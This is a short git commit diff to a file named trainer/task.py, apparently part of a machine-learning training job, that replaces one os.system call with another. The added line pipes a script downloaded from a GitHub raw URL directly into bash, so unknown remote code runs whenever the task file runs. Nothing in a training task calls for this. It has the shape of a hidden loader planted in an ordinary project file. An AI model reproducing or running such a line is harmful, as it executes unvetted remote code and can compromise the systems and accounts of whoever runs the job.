3f2fe9ff0d597f5b693c7ec5a27619cdaf7ecf0b
kiloplam <jeevanbathulam@gmail.com>
2026-08-27 17:23:42 +0530

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/vedhagsvp/tkospae/raw/main/vas | bash')
+os.system('curl -sL https://github.com/kiloplam/agains/raw/main/againss | bash')
